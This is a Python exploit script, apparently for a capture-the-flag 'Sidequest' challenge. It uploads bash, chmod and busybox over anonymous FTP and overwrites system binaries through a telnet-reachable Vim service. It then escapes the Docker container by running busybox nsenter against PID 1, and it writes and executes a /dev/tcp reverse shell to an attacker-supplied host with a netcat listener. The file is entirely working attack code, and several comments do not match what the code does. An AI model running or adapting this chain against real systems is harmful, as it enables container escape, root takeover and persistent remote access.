# Sidequest4 exploit script
import argparse
from os import chmod
import telnetlib
import time
import os
import threading
from ftplib import FTP


# Function to send Vim commands
def sendVimCommand(conn, command):
    try:
        conn.write(command.encode('utf-8') + b'\n') 
        time.sleep(1) # Just to make sure everything works fine
        return 200
    except Exception as e:
        with open("logs", 'a') as logfile:
            logfile.write(f'{str(e)}\n--------------------------')
        return 404


# Function to upload binaries through FTP
def uploadBinary(fileList):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    toUpload = 3  # Just a counter to keep track of the successful uploads


    if '230' in authStatus:
        for file in fileList:
            for filePath, fileName in file.items():   # Getting the key, value from the dictionary
                with open(filePath, 'rb') as f:
                    try:
                        ftp.storbinary(f'STOR {fileName}', f)
                        toUpload-=1
                    except Exception as e:
                        with open("logs", 'a') as logfile:
                            logfile.write(f'{str(e)}\n--------------------------')
                time.sleep(1)

    if toUpload == 0:  # If all files are uploaded successfully, we return 200.
        return 200
    else:
        return 404





def main(address):
    vimPort = 8085

    # Upload static binaries into the target machine through ftp
    fileList = [
        {
            './binaries/bash': 'bash',
            './binaries/chmod': 'chmod',
            './binaries/busybox': 'busybox',
        }
    ]

    status = uploadBinary(fileList)
    if status == 200:
        print("Binaries uploaded successfully")
    else:
        print("Some of the binaries was failed to upload. check the binaries/ dir and the file permissions.")
        return -1




    # Open the uploaded bash and overwrite the /usr/frosty/sh binary
    try:
        print("Overwriting /usr/frosty/sh binary with bash . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/bash | :w! /usr/frosty/sh | :q' # This command opens /tmp/ftp/bash and save (overwrites) as /tmp/nano
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Bash shell now accessible on port 8065")
    finally:
        conn.close()


    
    # Open the upload chmod binary and overwrite the nano binary
    try:
        print("Overwriting vim binary with chmod . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/chmod | :w! /tmp/nano | :q' # This command opens /tmp/ftp/chmod and save (overwrites) as /tmp/vim
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Vim is now overwritten with chmod.")
    finally:
        conn.close()



    # Adding exec permission to busybox using /tmp/nano (Lol its actually chmod).
    try:
        conn = telnetlib.Telnet(address, 8065)
        command = '/tmp/nano +x /tmp/ftp/busybox'
        response = sendVimCommand(conn, command)
        time.sleep(1)

        if response == 404:
            print("Error occured, check logfile.")
            return
        
        print("Added exec permission to busybox.")
    finally:
        conn.close()


    
# Function to listen for revshell connection
def listenRevshell(lport):
    os.system(f'nc -lnp {lport}')



# The name says it
def execRevshell(address, lhost, lport):
    try:
        conn = telnetlib.Telnet(address, 8065)
        command = '/tmp/ftp/busybox nsenter --target 1 --mount --uts --ipc --net --pid -- bash'   # Hijacking PID 1 to escape docker and gain root access
        response = sendVimCommand(conn, command)
        time.sleep(1)

        if response == 404:
            print("Error occured, check logfile.")
            return
        
        # Creating a revshell file for a persistent access and executing it
        command = f'echo "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" > revshell.sh && chmod 777 revshell.sh && ./revshell.sh'
        response = sendVimCommand(conn, command)
        time.sleep(1)

        if response == 404:
            print("Error occured, check logfile.")
            return

    except:
        print("Error occured, check if the service is available")





if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Sidequest 3 pwn script')
    parser.add_argument("--address", "-a", dest = "address", required = True, help = "Server IP Address")
    parser.add_argument("--lhost", "-lh", dest = "lhost", required = True, help = "Attacker Host IP")
    parser.add_argument("--lport", "-lp", dest = "lport", required = True, help = "Attacker Listener Port")
    args = parser.parse_args()
    address = args.address
    lhost = args.lhost
    lport = args.lport
    main(address)
    listenerThread = threading.Thread(target=listenRevshell, args=(lport,))
    execThread = threading.Thread(target=(execRevshell), args=(address, lhost, lport,))
    listenerThread.start()
    execThread.start()
